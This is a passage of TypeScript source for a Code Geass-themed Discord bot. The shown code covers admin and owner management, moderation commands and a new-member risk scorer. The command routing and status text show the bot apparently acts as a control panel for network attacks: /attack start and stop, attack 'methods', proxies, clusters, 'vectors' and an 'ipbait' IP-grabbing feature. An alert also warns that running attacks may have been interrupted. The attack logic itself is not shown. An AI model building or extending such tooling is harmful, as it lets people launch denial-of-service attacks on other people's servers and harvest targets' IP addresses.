    const guild = botClient!.guilds.cache.get(guildId);
    if (!guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Servidor \`${guildId}\` não encontrado.`)] }); return; }
    const name = guild.name;
    await guild.leave();
    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("🚪 SAÍDA FORÇADA").setDescription(`Bot saiu de **${name}** (\`${guildId}\`)`)] });
    return;
  }

}

// ═══════════════════════════════════════════════════════════════════════════
// /admins COMMAND HANDLER — gerenciar owners e admins do bot
// ═══════════════════════════════════════════════════════════════════════════
async function handleAdmins(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerId   = interaction.user.id;
  const callerName = interaction.user.username;
  const callerIsOwner = isOwner(callerId, callerName);
  const callerIsMod   = isMod(callerId, callerName);

  if (!callerIsOwner && !callerIsMod) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas donos e admins autorizados podem usar este comando.\n\n*"O poder não é concedido — é tomado pelos dignos."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
  const sub = interaction.options.getSubcommand();

  // ── LIST ──────────────────────────────────────────────────────────────────
  if (sub === "list") {
    const owners = listPanelOwners();
    const mods   = listPanelMods();

    const ownerDisplay = [
      `\`${BOOTSTRAP_OWNER_USERNAME}\` — 👑 **Bootstrap Owner** (hardcoded, acesso máximo)`,
      ...owners.map(id => `<@${id}> — \`${id}\``),
    ];
    const modDisplay = mods.length > 0
      ? mods.map(id => `<@${id}> — \`${id}\``)
      : ["*Nenhum admin adicionado*"];

    const embed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("👑 PAINEL DE ADMINISTRADORES — GEASS BRITÂNIA")
      .setDescription(`*"Aqueles que servem sob o olho do Geass — os confiáveis da Order."*\n\n` +
        `**Total de owners:** \`${owners.length + 1}\` | **Total de admins:** \`${mods.length}\``)
      .addFields(
        {
          name: `👑 OWNERS (${owners.length + 1}) — Acesso Total`,
          value: ownerDisplay.join("\n").slice(0, 1024),
          inline: false,
        },
        {
          name: `🛡️ ADMINS (${mods.length}) — Acesso Limitado`,
          value: modDisplay.join("\n").slice(0, 1024),
          inline: false,
        },
        {
          name: "🔐 Níveis de Acesso",
          value: [
            "**👑 Owner** — acesso completo: ataques, painel, ipbait, whois, admins",
            "**🛡️ Admin** — acesso ao ipbait, whois, painel básico",
            "**🔵 Membro** — comandos públicos apenas (attack, methods, info, help)",
          ].join("\n"),
          inline: false,
        },
      )
      .setTimestamp()
      .setFooter({ text: `${AUTHOR} • Solicitado por ${callerName}` });

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── ADD-OWNER ─────────────────────────────────────────────────────────────
  if (sub === "add-owner") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem promover outros owners.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (target.id === callerId) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Você já é owner.")] });
      return;
    }
    addPanelOwner(target.id);
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0xFFD700)
        .setTitle("👑 OWNER ADICIONADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) agora tem acesso de **owner** ao bot.\n\n*"Um novo aliado do Geass foi reconhecido."*`)
        .addFields({ name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] 👑 ${target.username} (${target.id}) promovido a owner por ${callerName} (${callerId})`);
    return;
  }

  // ── ADD-ADMIN ─────────────────────────────────────────────────────────────
  if (sub === "add-admin") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem adicionar admins.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (isOwner(target.id, target.username)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Este usuário já é owner — nível superior ao de admin.")] });
      return;
    }
    addPanelMod(target.id);
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle("🛡️ ADMIN ADICIONADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) agora é **admin** autorizado do bot.\n\n*"Mais um soldado da Order — bem-vindo ao Geass."*`)
        .addFields(
          { name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true },
          { name: "Acesso concedido", value: "ipbait, whois, painel básico", inline: true },
        )
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] 🛡️ ${target.username} (${target.id}) adicionado como admin por ${callerName} (${callerId})`);
    return;
  }

  // ── REMOVE ────────────────────────────────────────────────────────────────
  if (sub === "remove") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem remover acessos.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (target.username === BOOTSTRAP_OWNER_USERNAME) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ IMPOSSÍVEL", `O bootstrap owner \`${BOOTSTRAP_OWNER_USERNAME}\` é hardcoded e não pode ser removido.`)] });
      return;
    }
    const wasOwner = listPanelOwners().includes(target.id);
    const wasMod   = listPanelMods().includes(target.id);
    removePanelOwner(target.id);
    removePanelMod(target.id);

    if (!wasOwner && !wasMod) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", `<@${target.id}> não está na lista de owners nem admins.`)] });
      return;
    }

    const removedRole = wasOwner ? "owner" : "admin";
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0xFF6B6B)
        .setTitle("➖ ACESSO REVOGADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) teve o acesso de **${removedRole}** removido.\n\n*"O Geass não perdoa aqueles que perdem a confiança."*`)
        .addFields({ name: "Removido por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] ➖ ${target.username} (${target.id}) removido da lista de ${removedRole} por ${callerName} (${callerId})`);
    return;
  }
}

async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  // ── BAN ──────────────────────────────────────────────────────────────────
  if (sub === "ban") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason") ?? "Por ordem de Lelouch vi Britannia.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }
    if (target.id === interaction.user.id) { await interaction.editReply({ embeds: [buildErrorEmbed("GEASS NEGADO", "Até um rei não pode banir a si mesmo.")] }); return; }

    try {
      await interaction.guild.members.ban(target.id, { reason: `[Lelouch] ${reason}` });
      const embed = new EmbedBuilder()
        .setColor(0xC0392B)
        .setTitle("⚔️ BANISHMENT DECREE — GEASS ABSOLUTE")
        .setDescription(getRandQuote(LELOUCH_BAN_QUOTES))
        .addFields(
          { name: "⛔ Banished Subject", value: `${target.tag} (${target.id})`, inline: true },
          { name: "👁️ Decreed By",      value: `${interaction.user.tag}`,        inline: true },
          { name: "📜 Reason",           value: reason,                           inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN BAN] ${interaction.user.tag} banned ${target.tag} — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("BANISHMENT FAILED", String(e))] });
    }
    return;
  }

  // ── UNBAN ────────────────────────────────────────────────────────────────
  if (sub === "unban") {
    const userId = interaction.options.getString("userid", true).trim();
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      await interaction.guild.members.unban(userId, `[Lelouch] Pardon by ${interaction.user.tag}`);
      const embed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🕊️ PARDON GRANTED — BY ROYAL DECREE")
        .setDescription(`*"Even kings must sometimes show mercy — when it serves the strategy."*`)
        .addFields(
          { name: "✅ Pardoned ID",  value: `\`${userId}\``,         inline: true },
          { name: "👁️ Pardoned By", value: `${interaction.user.tag}`, inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("PARDON FAILED", `Could not unban \`${userId}\`. Ensure the ID is correct.\n\`${String(e).slice(0, 200)}\``)] });
    }
    return;
  }

  // ── CLEAR ────────────────────────────────────────────────────────────────
  if (sub === "clear") {
    const amount = interaction.options.getInteger("amount", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.channel || !interaction.channel.isTextBased()) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Canal de texto não encontrado.")] }); return;
    }

    try {
      const channel = interaction.channel as import("discord.js").TextChannel;

      // ── Pre-flight: verify bot has required permissions in this channel ──
      const botMember = interaction.guild?.members.me;
      if (botMember) {
        const botPerms = channel.permissionsFor(botMember);
        const missing: string[] = [];
        if (!botPerms?.has(PermissionFlagsBits.ManageMessages))     missing.push("`Manage Messages`");
        if (!botPerms?.has(PermissionFlagsBits.ReadMessageHistory))  missing.push("`Read Message History`");
        if (missing.length > 0) {
          await interaction.editReply({ embeds: [buildErrorEmbed(
            "⚠️ BOT SEM PERMISSÕES",
            `O bot não tem as permissões necessárias em <#${channel.id}>.\n\n` +
            `**Faltando:**\n${missing.join("\n")}\n\n` +
            `**Como corrigir:**\n` +
            `Vá em **Configurações do Servidor → Roles → [Cargo do Bot]** ` +
            `e ative as permissões acima. Ou edite as permissões do canal diretamente.`
          )] });
          return;
        }
      }

      const deleted = await channel.bulkDelete(amount, true); // true = skip >14d old
      const embed = new EmbedBuilder()
        .setColor(0xf39c12)
        .setTitle("🗑️ EVIDENCE ERASED — GEASS CLEAN SWEEP")
        .setDescription(getRandQuote(LELOUCH_CLEAR_QUOTES))
        .addFields(
          { name: "🗑️ Deleted",   value: `**${deleted.size}** messages`, inline: true },
          { name: "📍 Channel",   value: `<#${channel.id}>`,              inline: true },
          { name: "👁️ By Order", value: `${interaction.user.tag}`,        inline: true },
        )
        .setFooter({ text: `${AUTHOR} • Messages older than 14 days cannot be bulk deleted` })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      console.log(`[ADMIN CLEAR] ${interaction.user.tag} deleted ${deleted.size} messages in #${channel.name}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("CLEAR FAILED", String(e))] });
    }
    return;
  }

  // ── WARN ─────────────────────────────────────────────────────────────────
  if (sub === "warn") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason", true);
    await interaction.deferReply();

    const embed = new EmbedBuilder()
      .setColor(0xe67e22)
      .setTitle("⚠️ GEASS WARNING — FINAL NOTICE")
      .setDescription(getRandQuote(LELOUCH_WARN_QUOTES))
      .addFields(
        { name: "⚠️ Warned Subject", value: `${target} (${target.tag})`, inline: true },
        { name: "👁️ Issued By",      value: `${interaction.user.tag}`,    inline: true },
        { name: "📜 Reason",          value: reason,                       inline: false },
      )
      .setThumbnail(target.displayAvatarURL())
      .setFooter({ text: `${AUTHOR} • Next violation results in mute or ban` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });

    // Attempt to DM the warned user
    try {
      const dmEmbed = new EmbedBuilder()
        .setColor(0xe67e22)
        .setTitle(`⚠️ You received a warning in ${interaction.guild?.name ?? "the server"}`)
        .setDescription(`*"You have been warned by the king's Geass. Do not test my patience."*`)
        .addFields({ name: "📜 Reason", value: reason })
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await target.send({ embeds: [dmEmbed] });
    } catch { /* DM closed */ }
    console.log(`[ADMIN WARN] ${interaction.user.tag} warned ${target.tag} — ${reason}`);
    return;
  }

  // ── MUTE (timeout) ───────────────────────────────────────────────────────
  if (sub === "mute") {
    const target  = interaction.options.getUser("user", true);
    const minutes = interaction.options.getInteger("duration") ?? 10;
    const reason  = interaction.options.getString("reason") ?? "Por ordem de Lelouch vi Britannia.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.timeout(minutes * 60_000, `[Lelouch] ${reason}`);
      const embed = new EmbedBuilder()
        .setColor(0x9b59b6)
        .setTitle("🔇 SILENCED BY GEASS — ROYAL DECREE")
        .setDescription(getRandQuote(LELOUCH_MUTE_QUOTES))
        .addFields(
          { name: "🔇 Silenced Subject", value: `${target.tag}`,                                   inline: true },
          { name: "⏱️ Duration",         value: `**${minutes}** minute${minutes > 1 ? "s" : ""}`, inline: true },
          { name: "👁️ By Order",         value: `${interaction.user.tag}`,                         inline: true },
          { name: "📜 Reason",            value: reason,                                            inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      console.log(`[ADMIN MUTE] ${interaction.user.tag} muted ${target.tag} for ${minutes}m — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("MUTE FAILED", String(e))] });
    }
    return;
  }

  // ── UNMUTE ───────────────────────────────────────────────────────────────
  if (sub === "unmute") {
    const target = interaction.options.getUser("user", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.timeout(null);
      const embed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🔊 VOICE RESTORED — BY GEASS DECREE")
        .setDescription(`*"Your silence served its purpose. Rise, and speak carefully."*`)
        .addFields(
          { name: "🔊 Restored",   value: `${target.tag}`,         inline: true },
          { name: "👁️ By Order",  value: `${interaction.user.tag}`, inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("UNMUTE FAILED", String(e))] });
    }
    return;
  }

  // ── KICK ─────────────────────────────────────────────────────────────────
  if (sub === "kick") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason") ?? "Por ordem de Lelouch vi Britannia.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }
    if (target.id === interaction.user.id) { await interaction.editReply({ embeds: [buildErrorEmbed("GEASS NEGADO", "Até um rei não pode expulsar a si mesmo.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.kick(`[Lelouch] ${reason}`);
      const embed = new EmbedBuilder()
        .setColor(0xE67E22)
        .setTitle("👢 EXPULSION DECREE — GEASS ORDER")
        .setDescription(`*"You are banished from my presence — for now. Consider this a mercy compared to what awaits repeat offenders."*`)
        .addFields(
          { name: "👢 Expelled Subject", value: `${target.tag} (${target.id})`, inline: true },
          { name: "👁️ Decreed By",      value: `${interaction.user.tag}`,        inline: true },
          { name: "📜 Reason",           value: reason,                           inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: `${AUTHOR} • Unlike a ban, they may return` })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN KICK] ${interaction.user.tag} kicked ${target.tag} — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("KICK FAILED", String(e))] });
    }
    return;
  }

  // ── SLOWMODE ─────────────────────────────────────────────────────────────
  if (sub === "slowmode") {
    const seconds = interaction.options.getInteger("seconds", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.channel || !interaction.channel.isTextBased()) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Canal de texto não encontrado.")] }); return;
    }

    try {
      const ch = interaction.channel as import("discord.js").TextChannel;
      await ch.setRateLimitPerUser(seconds, `[Lelouch] Slowmode set by ${interaction.user.tag}`);
      const embed = new EmbedBuilder()
        .setColor(seconds === 0 ? 0x2ecc71 : 0x9b59b6)
        .setTitle(seconds === 0 ? "🔓 SLOWMODE DISABLED" : "🐢 SLOWMODE ENGAGED — GEASS THROTTLE")
        .setDescription(
          seconds === 0
            ? `*"Speed and efficiency — the kingdom flows unimpeded once more."*`
            : `*"I control the pace of this battlefield. ${seconds}s between each advance — by my Geass."*`
        )
        .addFields(
          { name: "⏱️ Delay",    value: seconds === 0 ? "Disabled" : `**${seconds}s** between messages`, inline: true },
          { name: "📍 Channel",  value: `<#${ch.id}>`,                                                   inline: true },
          { name: "👁️ Set By",  value: `${interaction.user.tag}`,                                        inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN SLOWMODE] ${interaction.user.tag} set slowmode ${seconds}s in #${ch.name}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("SLOWMODE FAILED", String(e))] });
    }
    return;
  }

  // ── LOGCHANNEL ────────────────────────────────────────────────────────────
  if (sub === "logchannel") {
    const channel = interaction.options.getChannel("channel", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guildId) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    setLogChannelId(interaction.guildId, channel.id);
    const embed = new EmbedBuilder()
      .setColor(COLORS.GOLD)
      .setTitle("📋 MOD LOG CHANNEL — CONFIGURED")
      .setDescription(`*"All intelligence shall be recorded. The Geass sees everything, and now so shall this channel."*`)
      .addFields(
        { name: "📋 Log Channel", value: `<#${channel.id}>`, inline: true },
        { name: "👁️ Set By",     value: `${interaction.user.tag}`, inline: true },
      )
      .setFooter({ text: `${AUTHOR} • All mod actions will be logged here` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    // Send a confirmation to the new log channel too
    void sendAdminLog(interaction.guildId, new EmbedBuilder()
      .setColor(COLORS.GOLD)
      .setTitle("📋 THIS IS NOW THE MOD LOG CHANNEL")
      .setDescription(`*"The Geass Intelligence Network has chosen this channel. All future mod actions will appear here."*`)
      .addFields({ name: "👁️ Configured By", value: `${interaction.user.tag}` })
      .setFooter({ text: AUTHOR })
      .setTimestamp()
    );
    console.log(`[ADMIN LOGCHANNEL] ${interaction.user.tag} set log channel to #${channel.id} in guild ${interaction.guildId}`);
    return;
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main(): Promise<void> {
  await deployCommands();

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.DirectMessages,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildModeration,
      // NOTE: GuildMembers & GuildPresences are Privileged Intents.
      // To enable them: Discord Developer Portal → Bot → Privileged Gateway Intents
      // → toggle "Server Members Intent" and "Presence Intent" → Save → restart bot.
      // Then uncomment the two lines below for join-order and live presence features:
      // GatewayIntentBits.GuildMembers,
      // GatewayIntentBits.GuildPresences,
    ],
  });
  botClient = client; // make accessible for DM alerts

  client.once(Events.ClientReady, c => {
    console.log(`\n╔════════════════════════════════════════╗`);
    console.log(`║   👁️  LELOUCH BRITANNIA — ONLINE        ║`);
    console.log(`║   Bot: ${c.user.tag.padEnd(32)} ║`);
    console.log(`║   Servers: ${String(c.guilds.cache.size).padEnd(28)} ║`);
    console.log(`╚════════════════════════════════════════╝\n`);
    console.log(`${AUTHOR}`);
    c.user.setPresence({
      activities: [{ name: "⚔️ /attack start — Choose your vector" }],
      status: "online",
    });

    // ── T006: Proactive API health check — alerts all log channels on failure ──
    let apiDownCount = 0;
    setInterval(async () => {
      try {
        const r = await fetch(`${API_BASE}/api/health`, { signal: AbortSignal.timeout(4000) });
        if (r.ok) {
          if (apiDownCount >= 2) {
            console.log("[HEALTH] ✅ API server recovered.");
            // Broadcast recovery to all configured log channels
            for (const guild of c.guilds.cache.values()) {
              const chId = getLogChannelId(guild.id);
              if (!chId) continue;
              const ch = await c.channels.fetch(chId).catch(() => null);
              if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
              await (ch as import("discord.js").TextChannel).send({
                embeds: [new EmbedBuilder()
                  .setColor(COLORS.GREEN)
                  .setTitle("✅ API SERVER — RECUPERADO")
                  .setDescription("O servidor API do Lelouch Britannia está novamente **online** e respondendo.\n*\"O Geass jamais se rende — a ordem foi restaurada.\"*")
                  .setTimestamp()
                  .setFooter({ text: AUTHOR })],
              }).catch(() => null);
            }
          }
          apiDownCount = 0;
        } else { apiDownCount++; }
      } catch { apiDownCount++; }

      if (apiDownCount === 2) {
        console.warn("[HEALTH] ⚠️ API server DOWN — broadcasting alert.");
        for (const guild of c.guilds.cache.values()) {
          const chId = getLogChannelId(guild.id);
          if (!chId) continue;
          const ch = await c.channels.fetch(chId).catch(() => null);
          if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
          await (ch as import("discord.js").TextChannel).send({
            embeds: [new EmbedBuilder()
              .setColor(COLORS.RED)
              .setTitle("🚨 ALERTA — API SERVER FORA DO AR")
              .setDescription(`O servidor API do **${BOT_NAME}** não está respondendo.\n\n⚠️ Ataques em execução podem ter sido interrompidos.\n*"Mesmo o Geass pode encontrar resistência. Investigando o problema..."*`)
              .addFields({ name: "🔗 Endpoint", value: `\`${API_BASE}/api/health\``, inline: true })
              .setTimestamp()
              .setFooter({ text: `${AUTHOR} • Health Monitor` })],
          }).catch(() => null);
        }
      }
    }, 5 * 60 * 1000); // check every 5 minutes
  });

  client.on(Events.InteractionCreate, async interaction => {
    try {
      if (interaction.isStringSelectMenu()) {
        await handleSelectMenu(interaction as StringSelectMenuInteraction);
        return;
      }

      if (interaction.isButton()) {
        await handleButton(interaction as import("discord.js").ButtonInteraction);
        return;
      }

      if (!interaction.isChatInputCommand()) return;

      // ── Universal command log (non-blocking) ──────────────────────────────
      void logCommandUsage(interaction);

      const { commandName } = interaction;

      if (commandName === "attack") {
        const sub = interaction.options.getSubcommand();
        if (sub === "start")      await handleAttackStart(interaction);
        else if (sub === "stop")  await handleAttackStop(interaction);
        else if (sub === "list")  await handleAttackList(interaction);
        else if (sub === "stats") await handleAttackStats(interaction);
      } else if (commandName === "analyze") {
        await handleAnalyze(interaction);
      } else if (commandName === "methods") {
        await handleMethods(interaction);
      } else if (commandName === "info") {
        await handleInfo(interaction);
      } else if (commandName === "help") {
        await handleHelp(interaction);
      } else if (commandName === "cluster") {
        await handleCluster(interaction);
      } else if (commandName === "geass") {
        await handleGeass(interaction);
      } else if (commandName === "lelouch") {
        await handleLelouch(interaction);
      } else if (commandName === "schedule") {
        await handleSchedule(interaction);
      } else if (commandName === "advisor") {
        await handleAdvisor(interaction);
      } else if (commandName === "proxy") {
        await handleProxy(interaction);
      } else if (commandName === "stats") {
        await handleStats(interaction);
      } else if (commandName === "admin") {
        await handleAdmin(interaction);
      } else if (commandName === "whois") {
        await handleWhois(interaction);
      } else if (commandName === "panel") {
        await handlePanel(interaction);
      } else if (commandName === "admins") {
        await handleAdmins(interaction);
      }
    } catch (err) {
      console.error("[INTERACTION ERROR]", err);
      try {
        const errEmbed = buildErrorEmbed("INTERNAL ERROR", "An unexpected error occurred. Please try again.");
        if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
          await interaction.reply({ embeds: [errEmbed], flags: MessageFlags.Ephemeral });
        }
      } catch { /**/ }
    }
  });

  // ── New member alert — scans risk and alerts mod log channel ─────────────
  // Note: guildMemberAdd fires for all joins only when GuildMembers privileged
  // intent is enabled in the Developer Portal + uncommented in the intents above.
  // Without it, this still fires for the bot's own join events.
  client.on(Events.GuildMemberAdd, async (member) => {
    try {
      const channelId = getLogChannelId(member.guild.id);
      if (!channelId) return;

      const fetched = await member.user.fetch(true).catch(() => member.user);
      const sf = (() => {
        const DISCORD_EPOCH = 1420070400000n;
        const bigId = BigInt(fetched.id);
        return { timestamp: Number((bigId >> 22n) + DISCORD_EPOCH) };
      })();
      const accountAgeDays = Math.floor((Date.now() - sf.timestamp) / 86_400_000);
      const createdTs = Math.floor(sf.timestamp / 1000);

      // Quick risk score
      let riskScore = 0;
      const riskFactors: string[] = [];
      if (accountAgeDays < 3)   { riskScore += 50; riskFactors.push("⚠️ Conta com menos de 3 dias"); }
      else if (accountAgeDays < 7)  { riskScore += 35; riskFactors.push("⚠️ Conta com menos de 7 dias"); }
      else if (accountAgeDays < 30) { riskScore += 20; riskFactors.push("⚠️ Conta com menos de 30 dias"); }
      if (!fetched.avatar)  { riskScore += 10; riskFactors.push("📷 Avatar padrão (nunca customizou)"); }
      const digitRatio = (fetched.username.match(/\d/g)?.length ?? 0) / fetched.username.length;
      if (digitRatio > 0.5) { riskScore += 15; riskFactors.push("🔢 Username com muitos números"); }
      if (/^[a-z]{2,5}\d{4,}$/i.test(fetched.username)) { riskScore += 10; riskFactors.push("🤖 Padrão de username de bot/alt"); }

      const riskLevel = riskScore >= 60 ? "🔴 CRÍTICO" : riskScore >= 40 ? "🟠 ALTO" : riskScore >= 20 ? "🟡 MÉDIO" : "🟢 BAIXO";
      const embedColor = riskScore >= 60 ? 0xFF0000 : riskScore >= 40 ? 0xFF8800 : riskScore >= 20 ? 0xFFDD00 : 0x00CC00;

      // Only alert if risk is medium or above
      if (riskScore < 20) return;

      const embed = new EmbedBuilder()
        .setColor(embedColor)
        .setTitle(`🚨 NOVO MEMBRO — ALERTA DE RISCO ${riskLevel}`)
        .setThumbnail(fetched.displayAvatarURL({ size: 256 }))
        .setDescription(
          riskScore >= 60
            ? `*"Meu Geass detectou uma ameaça potencial entrando no reino. Atenção máxima, soldados."*`
            : `*"Um novo súdito chegou. O Geass identifica pontos de atenção a monitorar."*`
        )
        .addFields(
          { name: "👤 Usuário",        value: `${fetched.username} (<@${fetched.id}>)`,              inline: true  },
          { name: "🪪 ID",             value: `\`${fetched.id}\``,                                    inline: true  },
          { name: "📅 Conta criada",   value: `<t:${createdTs}:R> (\`${accountAgeDays}d\` atrás)`,   inline: false },
          {
            name: `⚠️ FATORES DE RISCO (score: ${riskScore}/100)`,
            value: riskFactors.join("\n") || "Nenhum fator detectado",
            inline: false,
          },
        )
        .setFooter({ text: `${AUTHOR} • Use /whois para dossier completo` })
        .setTimestamp();

      const ch = await botClient!.channels.fetch(channelId);
      if (ch && ch.isTextBased() && "send" in ch) {
        await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
      }

      console.log(`[NEW MEMBER] ${fetched.username} (${fetched.id}) joined ${member.guild.name} — risk score: ${riskScore} (${riskLevel})`);
    } catch (e) {
      console.warn("[MEMBER JOIN ALERT]", e instanceof Error ? e.message : e);
    }
  });

  client.on(Events.Error, err => {
    console.error("[CLIENT ERROR]", err);
  });

  // Gateway connection lifecycle — helps diagnose "bot stopped responding" issues
  client.on(Events.ShardDisconnect, (closeEvent, shardId) => {
    console.warn(`[SHARD ${shardId}] Disconnected — code ${closeEvent.code}. Auto-reconnecting...`);
  });
  client.on(Events.ShardReconnecting, (shardId) => {
    console.log(`[SHARD ${shardId}] Reconnecting to Discord gateway...`);
  });
  client.on(Events.ShardResume, (shardId, replayedEvents) => {
    console.log(`[SHARD ${shardId}] Resumed — replayed ${replayedEvents} events. Bot is back online.`);
  });

  await client.login(BOT_TOKEN);
}

// ── Global safety net — prevent silent crashes from unhandled async errors ────
process.on("unhandledRejection", (reason) => {
  console.error("[UNHANDLED REJECTION — bot kept alive]", reason);
});
process.on("uncaughtException", (err) => {
  console.error("[UNCAUGHT EXCEPTION — bot kept alive]", err);
});

main().catch(err => {
  console.error("Fatal error:", err);
  process.exit(1);
});
